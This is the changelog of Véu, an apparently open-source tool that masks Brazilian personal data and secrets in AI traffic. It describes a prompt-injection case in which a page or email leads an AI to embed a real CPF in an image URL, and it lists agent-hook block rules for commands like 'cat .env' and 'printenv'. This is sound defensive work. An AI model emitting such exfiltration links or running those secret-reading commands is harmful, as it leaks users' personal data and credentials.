# Changelog

Todas as mudanças relevantes ficam registradas aqui.
O formato segue o [Keep a Changelog](https://keepachangelog.com/pt-BR/1.1.0/) e o projeto usa [versionamento semântico](https://semver.org/lang/pt-BR/).

## [Unreleased]

### Adicionado
- **Avaliação com dados de terceiros:** `veu avaliar --externo br-agentic|privacy-filter-br|todos` baixa uma vez (versão fixa, conferida pelo sha256) dois conjuntos públicos em português e mede o vazamento, com intervalo de confiança de 95% e a lista dos tipos que estão fora do escopo do Véu.
- **Conjunto de desafio congelado** (41 textos escritos à mão), incluído no `veu avaliar`. Um teste impede editá-lo.
- **Comparação com o Microsoft Presidio** nos mesmos textos (`scripts/comparar_presidio.py`): 2,6% de vazamento do Véu contra 52,0% do Presidio no privacy-filter-br, e 23,3% contra 53,1% no BR-Agentic.
- `veu demonstrar` testa também ataques à restauração (CPF na URL de uma imagem, chave num link e num comando, marcador forjado) e tem um controle negativo: sai com 3 se o envio direto não vazar, porque nesse caso a demonstração não estaria medindo nada.
- Documentos já mascarados pela metade (`529.982.***-**`, `***.982.247-**`, `11.222.333/****-**`, e RG, CNH e título com contexto), CNPJ, RG e CEP com espaços e CNH com hífen. No holdout do privacy-filter-br, o vazamento caiu de 20,2% para 6,4%.

- **Cache de detecção** para agentes que reenviam a conversa inteira a cada turno (Python e JavaScript): textos longos já analisados não são analisados de novo. Guarda só posições e tipos, nunca o texto, com chave BLAKE2 e sal aleatório; no proxy, cada credencial tem o seu espaço. `[deteccao] cache = 0` desliga. Acertos e falhas aparecem em `/veu/estatisticas` e `/veu/metricas`.

- **Nomes do Censo 2022 do IBGE:** cerca de 5 mil prenomes e 2 mil sobrenomes (`scripts/gerar_nomes_ibge.py`). Prenomes que também são palavras comuns no dicionário pt_BR ("Rosa", "Natal") só contam com contexto, e quem é muito mais comum como sobrenome ("Silva") não conta como prenome. No privacy-filter-br, o vazamento de nomes caiu de 15,4% para 1,4%.
- **Propagação de nomes confirmados:** depois de "Rayane Souza", as menções a "rayane", "RAYANE SOUZA" ou "Jose" (sem acento) no mesmo texto recebem o mesmo marcador.
- Municípios do IBGE que não começam com um prenome ("Belo Jardim", mas não "Paulo Afonso"), sequências que começam com tipo de logradouro ("Avenida Paulista") ou com São, Santo e Santa e rótulos de formulário ("Razão Social", "Certidão de Nascimento") não são mais lidos como nomes de pessoas.

- **`veu gancho comando`** (PreToolUse de Bash e Grep, e `beforeShellExecution` do Cursor): o terminal e a busca deixam de ser um atalho para ler segredos. Bloqueia comandos que leem arquivos com segredos (`cat .env`), que mostram variáveis de ambiente (`printenv`, `echo $OPENAI_API_KEY`) e buscas com conteúdo que passariam por `.env`, chaves ou `credentials.json`. O plugin do Claude Code já vem com ele.
- `veu gancho prompt --exigir-proxy` bloqueia o prompt quando o agente não está apontado para o proxy do Véu.
- **Codex CLI pelo proxy:** a Responses API passa a esconder `custom_tool_call` (como o `apply_patch`), `local_shell_call` e saídas de ferramentas em lista, e a restaurar em streaming a entrada de ferramentas de texto livre, com a mesma política (chaves não voltam, links não recebem dados reais).
- **Normalização para a detecção:** caracteres invisíveis (largura zero, hífen invisível), hífens tipográficos (`529.982.247‑25` copiado do Word) e dígitos e letras de largura total não escondem mais dados do detector. O texto enviado e o restaurado continuam como estavam. Em JavaScript, a máscara de CPF passa a aceitar dígitos de largura total, como em Python.

- **Cofre cifrado no Redis** (AES-256-GCM, chave em `VEU_CHAVE_COFRE`, fora do Redis). O nome da sessão entra como dado autenticado: um cofre não pode ser copiado para outra sessão, e um cofre alterado ou em texto puro é ignorado.
- **Restaurações contadas:** a auditoria registra quantos valores reais voltaram em cada resposta (`restaurados`, por tipo, sem os valores), e `/veu/estatisticas` e `/veu/metricas` também. `[restauracao] max_por_resposta` limita esse número por resposta.
- **Âncora da auditoria:** `veu auditoria ancorar` mostra o último hash da cadeia para guardar fora do servidor, e `veu auditoria verificar --ancora` falha se ele sumir (linhas apagadas no fim ou log trocado).
- **Leitura de links sem SSRF:** na expansão de links do proxy, o link e cada redirecionamento precisam ser https e apontar para endereços públicos (nada de 169.254.169.254, localhost ou rede interna).

- **Extensão para Firefox** (128 ou mais novo): o empacotamento gera também `veu-extensao-firefox-<versão>.zip`, com o manifesto que o Firefox espera.

- `veu servir --workers N` abre vários processos (exige sessões no Redis; uma cadeia de auditoria por processo).
- **Página web:** textos grandes (20 mil caracteres ou mais) são analisados num Web Worker, sem travar a página, e as instâncias do Véu são reaproveitadas entre as teclas.
- **Testes de propriedade** (hypothesis): anonimizar e restaurar devolve o texto original; o streaming dá o mesmo resultado que o lote, cortado em qualquer ponto; o leitor de SSE remonta os eventos cortados em qualquer byte (inclusive no meio de um caractere UTF-8 e com CRLF); bytes aleatórios não derrubam os leitores de SSE e NDJSON. `VEU_HIPOTESES=5000` faz uma busca longa.

### Corrigido
- Restauração em streaming: um marcador solto colado a uma palavra (`_CPF_1`, `xCPF_1`) era restaurado quando chegava num pedaço separado, embora no texto inteiro não fosse. Achado pelos testes de propriedade.

### Alterado
- **Extensão:** mostrar os dados reais direto na página passa a ser opcional (desligado por padrão), porque o código do site de IA também consegue ler a página. Os dados reais continuam a um clique: copiar a seleção, o campo Restaurar do ícone ou a opção no popup.
- **Extensão:** o script roda antes da página (`document_start`), para tratar o colar antes do código do site, e reconhece os marcadores do operador `hash` com 16 caracteres.
- **Incompatível:** sessões no Redis exigem `VEU_CHAVE_COFRE` (ou `permitir_cofre_sem_cifra = true`). O extra `veu[redis]` passa a instalar o `cryptography`.
- `veu avaliar --max-vazamento` vale para a validação (e para o conjunto escolhido), não para o desafio, que existe para mostrar onde o Véu ainda erra.

## [0.6.0] - 2026-11-07

Restauração segura contra injeção de prompt. Como o provedor de IA só vê marcadores, o dado real só reaparece na restauração; agora ela segue regras fixas, que não dependem de o modelo obedecer.

### Segurança
- **Os dados reais não voltam dentro de links, imagens e URLs.** Uma página ou um e-mail lido pela IA pode induzi-la a escrever `![x](https://site/?d=[CPF_1])`; antes, a restauração trocava o marcador e o navegador enviava o CPF real ao site. Vale para markdown (inclusive links por referência e com `<...>`), autolinks, URLs soltas (inclusive `dominio.com/...` sem `https://`), `mailto:`, atributos HTML (`src`, `href`, `srcset`, `url(...)`), argumentos de ferramentas em JSON (inclusive `\/` e `\u002f`) e streaming com o link cortado entre pedaços. Domínios confiáveis podem ser liberados em `[restauracao] dominios_links`.
- **Chaves de API, tokens e senhas não são restaurados nos argumentos de ferramentas** de agentes (`segredos_em_ferramentas = true` volta ao comportamento antigo). `ferramentas = false` desliga a restauração de todos os argumentos.
- **Marcadores forjados são desarmados:** um `[CPF_1]` que já chega no texto (escrito numa página, num e-mail ou num documento) vira `[CPF#1]` antes do envio e nunca é restaurado.
- **MCP:** `restaurar_texto`, que devolve os dados reais para a conversa, vem desligada (`veu mcp --com-restauracao` liga). A nova `restaurar_para_arquivo` grava a resposta com os dados reais num arquivo local novo (nunca sobrescreve) e devolve só o caminho.
- **Operador `hash`:** HMAC-SHA256 com chave derivada só para esse uso e 64 bits na saída (`[CPF_3fa2c1d9e07b4a12]`); uma colisão gera erro em vez de trocar uma pessoa por outra. `VEU_SEGREDO` e `VEU_SEGREDO_AUDITORIA` precisam ter pelo menos 32 caracteres.
- Um teste garante a falha fechada: se a detecção quebrar, a requisição não é enviada ao provedor.

### Adicionado
- Seção `[restauracao]` no `veu.toml` (`links`, `dominios_links`, `ferramentas`, `segredos_em_ferramentas`) e opção `restore` na biblioteca JavaScript.
- `veu restaurar --restaurar-links`.
- [Modelo de ameaças](docs/modelo-de-ameacas.md): fronteiras de confiança, ameaças, defesas e o que o Véu não protege.
- Casos de restauração compartilhados entre Python e JavaScript (`js/test/restauracao.json`), testados inteiros e cortados em qualquer ponto.

### Alterado
- **Incompatível:** os marcadores do operador `hash` mudaram (16 caracteres hexadecimais, chave derivada). Pseudônimos gerados com versões anteriores não batem com os novos.
- **Incompatível:** um `VEU_SEGREDO` com menos de 32 caracteres impede o Véu de iniciar, com uma mensagem que ensina a gerar um novo.
- README, banner, descrições do PyPI e do npm, GitHub Action, hook de pre-commit e servidor MCP passam a apresentar o Véu como proteção de dados pessoais e segredos em geral, com suporte completo a documentos brasileiros (e não só para dados brasileiros).

## [0.5.2] - 2026-11-07

Ajustes do Notion, encontrados testando com uma conta de verdade.

### Corrigido
- Links do Notion no formato atual (`app.notion.com/p/...`) não eram reconhecidos e eram tratados como página comum. Agora `app.notion.com`, `notion.so` e `notion.site` funcionam no `veu ler`, no `ler_protegido` e na leitura de links do proxy.
- Pessoas que o próprio Notion identifica (propriedades do tipo pessoa, "criado por" e menções @) passam a ser sempre escondidas, inclusive no título e no e-mail do usuário, mesmo quando a detecção automática não reconheceria o nome (como "fulano. Sobrenome").

## [0.5.1] - 2026-11-06

Ajustes do Linux, encontrados testando o instalador num Kali Linux de verdade.

### Corrigido
- Atalho do Linux e do macOS com ícone PNG (alguns menus do Linux não mostram o `.ico`).
- A área de trabalho do Linux vem do próprio sistema (`xdg-user-dir`): em português ela pode se chamar "Área de Trabalho".
- O atalho da área de trabalho já é marcado como confiável no GNOME e no Xfce, sem a pergunta "lançador não confiável".
- A publicação automática no npm não usa mais um token falso no lugar da publicação confiável.

### Adicionado
- O CI roda o instalador de verdade no Ubuntu, no macOS e no Windows a cada mudança.

## [0.5.0] - 2026-11-06

Instalação e uso sem saber programar.

### Adicionado
- **Instalador de um comando:**
  - Windows: `irm https://guhttps.github.io/veu/instalar.ps1 | iex`;
  - macOS e Linux: `curl -LsSf https://guhttps.github.io/veu/instalar.sh | sh`;
  - instala o Python (pelo uv) e o Véu na pasta do usuário, sem administrador, cria o atalho Véu e abre o painel.
- **Painel (`veu painel`)**, no navegador e só no computador local:
  - protege e restaura planilhas, documentos, apresentações, PDFs e textos arrastando o arquivo;
  - conecta o Claude Desktop e o Cursor com um botão;
  - mostra o endereço para n8n, Make e Zapier;
  - escolhe o que proteger com caixinhas, sem editar arquivo;
  - liga o Véu junto com o computador;
  - mostra a atividade.

  Salvar as configurações reinicia o Véu sozinho, em menos de um segundo.
- `veu atalhos`: atalho Véu na área de trabalho e no menu (Windows, macOS e Linux).
- Página "Instalar no computador" no site, com os comandos prontos para copiar.

### Alterado
- README reorganizado para quem não programa e para quem programa.

## [0.4.0] - 2026-11-06

Além do proxy e além dos dados brasileiros: segredos, navegador, JavaScript, Notion e documentos, empresas e agentes.

### Detecção
- **Segredos:**
  - chaves de API de mais de 30 serviços (OpenAI, Anthropic, AWS, Google, GitHub, GitLab, Stripe, Slack, Hugging Face, Groq, Notion, Mercado Pago, Asaas...);
  - JWT, tokens Bearer e Basic;
  - senhas em configuração e em prosa;
  - chaves privadas, inclusive dentro de JSON;
  - URLs de conexão com senha;
  - campos como `api_key: ...`.
- Novo detector `segredos`, ligado por padrão. As regras com prefixo ficam em `data/segredos.json`, compartilhadas com a versão em JavaScript.
- IBAN (módulo 97) e telefones internacionais.
- Operadores `sintetico` (chave falsa no mesmo formato) e `mascara` (`sk-proj-****`) para segredos.

### Navegador e JavaScript
- **Página web** (GitHub Pages): proteger, copiar e restaurar sem instalar nada. A detecção roda no navegador e a página bloqueia conexões.
- **Extensão para Chrome e Edge:**
  - funciona em ChatGPT, Claude, Gemini, Copilot, Perplexity, DeepSeek e outros;
  - modos avisar, proteger e bloquear;
  - protege ao colar e ao enviar e restaura as respostas na tela;
  - menu do botão direito em qualquer site;
  - política gerenciada para empresas.
- **`@guhttps/veu`**, a biblioteca JavaScript e TypeScript:
  - a mesma detecção da versão em Python, garantida por um teste de conformidade;
  - `createFetch()` para os SDKs da OpenAI e da Anthropic;
  - middleware para o AI SDK da Vercel;
  - pacote para o navegador.
- Teste de ponta a ponta num Chrome de verdade.

### Notion, Google e documentos
- `veu ler` lê páginas e bases do Notion, Google Docs, Sheets e Slides, links, Word, Excel, PowerPoint e PDF, já protegidos.
- `veu anonimizar` e `veu restaurar` tratam Word, Excel e PowerPoint no próprio formato, mantendo a formatação, as fórmulas, os cabeçalhos e os metadados. PDF sai como texto.
- Ferramenta MCP `ler_protegido`. `verificar_arquivo` e `anonimizar_arquivo` aceitam documentos.
- `expandir_links` no proxy: links do Notion e do Google viram o conteúdo protegido, só para domínios permitidos.

### Empresas
- Equipes com token e política próprios (`[equipes.NOME]`), com a equipe na auditoria e nas métricas.
- Auditoria encadeada (hash da linha anterior e HMAC opcional) e `veu auditoria verificar`.
- Sessões no Redis (`sessoes = "redis://..."`) com trava por sessão, para várias réplicas.
- Desvio de requisições com dados sensíveis para um modelo interno (`desviar_para`, `modelo_desvio`, `desviar_tipos`).
- Prontidão em `/veu/pronto`.
- Guardrail para o LiteLLM Proxy (`veu.integrations.litellm.VeuGuardrail`).
- Chart Helm (HPA, PodDisruptionBudget, NetworkPolicy, ServiceMonitor, contêiner sem root e só leitura) e docker-compose com Redis.
- A imagem Docker passa a ser publicada em `ghcr.io/guhttps/veu` a cada release.

### Agentes
- `veu gancho prompt` e `veu gancho arquivo` para Claude Code e Cursor:
  - prompts com segredos são bloqueados;
  - o agente não lê arquivos com segredos e recebe a sugestão de usar `ler_protegido`.
- Plugin do Claude Code com skill, ganchos e servidor MCP, instalável pelo marketplace deste repositório.

### Corrigido
- Linhas de bases de dados do Notion saíam sem a coluna de título.
- Documentos do Word podiam deixar parágrafos sem proteção quando o lxml reaproveitava endereços de memória (`id()` trocado pelo próprio elemento).

### Outros
- `veu demonstrar` mostra, sem chave de API, o que chegaria ao provedor com e sem o Véu.
- Novos extras: `documentos`, `litellm` e `redis`.

## [0.3.0] - 2026-11-05

Muitas integrações novas e mais flexibilidade.

### Integrações
- **LangChain nativo:** `protect_model()` protege qualquer modelo ou cadeia (invoke, stream, async, argumentos de ferramentas) e `VeuDocumentTransformer` anonimiza documentos para RAG com um único cofre.
- **Servidor MCP** (`veu mcp`) para Claude Code, Claude Desktop e Cursor, com ferramentas que auditam e anonimizam arquivos sem trazer os dados para a conversa.
- **Decorador `@protect`** para qualquer função que chama um modelo, inclusive `async` e geradoras (streaming).
- **`veu.session()`:** um cofre compartilhado por várias chamadas, com `anonymize_data` para dicts e listas e `restore_stream`.
- **API nativa do Ollama** (`/api/chat`, `/api/generate`, `/api/embed`) com streaming em JSON por linha.
- **10 provedores novos:** xAI, Perplexity, Fireworks, Cerebras, Hugging Face, Cohere, NVIDIA, SambaNova, vLLM e llama.cpp. Guia para o Azure OpenAI.
- **Arquivos de dados:** `veu anonimizar` e `veu restaurar` entendem CSV, TSV, JSON e JSONL, com `--campos` e `--forcar campo=TIPO`, e o mesmo marcador em todas as linhas.
- **pandas:** `anonymize_dataframe()` e `restore_dataframe()`.
- **Observabilidade:** integrações com Sentry (`before_send`), structlog e loguru, e métricas Prometheus em `/veu/metricas`.
- **CI:** GitHub Action (`uses: guhttps/veu@v0.3.0`) com anotações no PR, e `veu verificar --formato github|sarif|json` (SARIF para a aba Security).

### Flexibilidade
- Detectores próprios por `Veu(extra_recognizers=[...])`, por caminho de importação no `veu.toml` ou como plugin (entry point `veu.detectores`).
- `ignorar_padroes`: exceções por expressão regular.
- Regras por provedor: `anonimizar`, `operador` e `bloquear`, inclusive para os provedores prontos.
- Cabeçalho `X-Veu-Operador` para escolher o operador por requisição (`operador_por_requisicao`).

### Corrigido
- Caminhos `/veu/...` desconhecidos (como `/veu/metricas` com as métricas desligadas) respondem 404 em vez de serem repassados ao provedor.
- Tuplas dentro de listas e dicts agora também são anonimizadas.

## [0.2.0] - 2026-11-04

Revisão de segurança.

### Segurança
- Sessões do proxy separadas pela credencial do cliente: com outra chave de API, não dá mais para reutilizar o identificador de sessão de alguém e pedir ao modelo que repita os marcadores dela.
- A API REST só continua sessões que ela mesma criou (identificadores aleatórios), e as sessões da API e do proxy ficam em cofres separados.
- No localhost, o servidor só aceita o Host `localhost`/`127.0.0.1` e recusa requisições com `Origin` de outro site, contra DNS rebinding e CSRF vindos de páginas abertas no navegador.
- Fora do localhost, o servidor não inicia sem `VEU_TOKEN`, a menos que `VEU_PERMITIR_SEM_TOKEN=1`.
- Log de acesso do servidor HTTP desligado, porque a URL pode trazer a chave da API (`?key=` do Gemini).
- Cookies, `Referer` e `Origin` do cliente não são repassados ao provedor, e o `Set-Cookie` do provedor não volta ao cliente.
- Limite de tamanho do corpo (`limite_corpo_mb`, padrão de 20 MB) e processamento fora do laço principal do servidor.
- Erros de conexão com o provedor não repetem mais detalhes internos (como a URL com a chave).
- Cabeçalhos de segurança no playground (CSP, `frame-ancestors 'none'`) e escape de todos os rótulos exibidos.
- O cofre salvo pela CLI é criado com permissão só para o dono (Linux e macOS).
- E-mails do modo sintético e dos exemplos usam domínios reservados (`example.com`), para nunca inventar o endereço de alguém de verdade.

### Corrigido
- A ligação de nomes parciais tinha custo quadrático: um texto de 1 MB levava cerca de 40 segundos e agora leva cerca de 3.
- Condição de corrida: duas requisições simultâneas na mesma sessão podiam receber o mesmo marcador para valores diferentes.
- JSON aninhado demais agora é recusado com erro 400 em vez de erro interno.

### Alterado
- `POST /veu/v1/anonimizar` com uma `sessao` que não existe responde 404 em vez de criar a sessão.
- Requisições `OPTIONS` não são mais repassadas ao provedor.

## [0.1.0] - 2026-11-04

Primeira versão.

### Detecção
- 21 tipos de dados brasileiros, com validação de dígitos verificadores de CPF, CNPJ (numérico e alfanumérico), PIS, CNS, CNH, título de eleitor, RENAVAM, processo CNJ e cartões (Luhn).
- Nomes de pessoas por listas de nomes brasileiros, capitalização e contexto, sem modelo de linguagem; detectores opcionais com spaCy e com um modelo local compatível com OpenAI.
- Endereços com logradouro, nome, número e complemento.
- Limiar de pontuação, lista de valores permitidos e padrões personalizados.

### Anonimização
- Operadores `token`, `sintetico`, `mascara`, `remover` e `hash`, configuráveis por tipo de dado.
- Cofre reversível, com o mesmo marcador para grafias diferentes do mesmo valor e ligação de nomes parciais ao nome completo.
- Restauração tolerante a marcadores reescritos pelo modelo e restauração em streaming.

### Integrações
- Proxy para OpenAI (Chat Completions, Responses, Embeddings e Completions), Anthropic (Messages) e Gemini (generateContent e streamGenerateContent), com e sem streaming.
- Atalhos para Groq, OpenRouter, DeepSeek, Mistral, Together, Maritaca, Ollama, LM Studio e o Gemini compatível com OpenAI, além de provedores próprios.
- Transportes para `httpx` e `httpx2` e atalhos `openai_client()` e `anthropic_client()`.
- API REST, playground, filtro de `logging`, hook de pre-commit, CLI e Dockerfile.
- Política de bloqueio por tipo de dado, sessões, token de acesso, estatísticas e log de auditoria só com contagens.

### Benchmark
- Gerador de textos anotados com dados falsos, conjuntos de desenvolvimento, validação e casos difíceis, e o comando `veu avaliar`.

[Unreleased]: https://github.com/guhttps/veu/compare/v0.6.0...HEAD
[0.6.0]: https://github.com/guhttps/veu/compare/v0.5.2...v0.6.0
[0.5.2]: https://github.com/guhttps/veu/compare/v0.5.1...v0.5.2
[0.5.1]: https://github.com/guhttps/veu/compare/v0.5.0...v0.5.1
[0.5.0]: https://github.com/guhttps/veu/compare/v0.4.0...v0.5.0
[0.4.0]: https://github.com/guhttps/veu/compare/v0.3.0...v0.4.0
[0.3.0]: https://github.com/guhttps/veu/compare/v0.2.0...v0.3.0
[0.2.0]: https://github.com/guhttps/veu/compare/v0.1.0...v0.2.0
[0.1.0]: https://github.com/guhttps/veu/releases/tag/v0.1.0
